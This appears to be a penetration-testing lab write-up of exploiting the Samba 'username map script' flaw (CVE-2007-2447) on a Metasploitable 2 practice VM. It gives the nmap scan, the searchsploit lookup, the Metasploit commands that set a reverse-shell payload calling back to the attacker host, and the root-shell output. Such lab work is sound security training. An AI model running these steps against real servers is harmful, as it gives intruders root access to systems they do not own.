# Metasploitable 2 — Samba "Username map script" Command Execution

**CVE:** CVE-2007-2447
**Target:** 192.168.100.10 (Metasploitable 2 in QEMU)
**Attacker:** Kali Linux (192.168.100.1)
**Date:** 24 September 2026
**Result:** Root shell obtained

## Summary

Exploited Samba 3.0.20 through the `username map script` command
injection vulnerability to obtain a root shell on the target.

## 1. Reconnaissance

    sudo nmap -sV -Pn 192.168.100.10

Key services:

| Port | Service | Version |
|------|---------|---------|
| 21   | ftp     | vsftpd 2.3.4 |
| 22   | ssh     | OpenSSH 4.7p1 |
| 80   | http    | Apache 2.2.8 |
| 139  | netbios-ssn | Samba smbd 3.X |
| 445  | netbios-ssn | Samba smbd 3.X |
| 1524 | bindshell | Metasploitable root shell |
| 3306 | mysql   | MySQL 5.0.51a |
| 6667 | irc     | UnrealIRCd |

## 2. Vulnerability Identification

    searchsploit samba 3

Relevant result:

- Samba 3.0.20 < 3.0.25rc3 - 'Username map script' Command Execution
  (Metasploit) -> unix/remote/16320.rb

**CVE:** CVE-2007-2447

**Background:** Samba versions 3.0.20 through 3.0.25rc3 allow
command injection via the `username map script` option. The
username is passed to an external script without sanitization,
allowing shell metacharacters to execute arbitrary commands as
root.

## 3. Exploitation

    msfconsole -q
    msf > search Samba 3.0.20
    msf > use exploit/multi/samba/usermap_script
    msf > set RHOSTS 192.168.100.10
    msf > set LHOST 192.168.100.1
    msf > set payload cmd/unix/reverse
    msf > run

Output:

    [*] Started reverse TCP double handler on 192.168.100.1:4444
    [*] Accepted the first client connection...
    [*] Accepted the second client connection...
    [*] Command shell session 1 opened
        (192.168.100.1:4444 -> 192.168.100.10:37771)

## 4. Post-Exploitation

    whoami
    root

    pwd
    /

    ls
    MJJJZqNXRHU  QabWzduUUj  bin  boot  cdrom  dev  etc
    home  initrd  initrd.img  lib  lost+found  media
    mnt  nohup.out  opt  proc  root  sbin  srv  sys
    tmp  usr  var  vmlinuz

Root shell confirmed. Full filesystem access.

## 5. Lessons Learned

1. Samba 3.0.20 is vulnerable to command injection via the
   username map script. Any Samba version in the 3.0.20–3.0.25rc3
   range should be tested.
2. This exploit worked first try — stateless, no stuck ports,
   unlike the vsftpd backdoor which left port 6200 in a bad state.
3. Payload choice matters. `cmd/unix/reverse` uses `/dev/tcp`
   which is more reliable than netcat when the target may not
   have nc installed.
4. Ports 139/445 are a massive attack surface. Always SearchSploit
   Samba versions immediately after scanning.

## 6. Next Steps

- Enumerate Samba shares: `smbclient -L //192.168.100.10`
- Test other Samba exploits (3.0.21–3.0.24 heap overflow)
- UnrealIRCd (port 6667) — known backdoor
- MySQL (port 3306) — default credentials
- Tomcat manager (port 8180) — default credentials
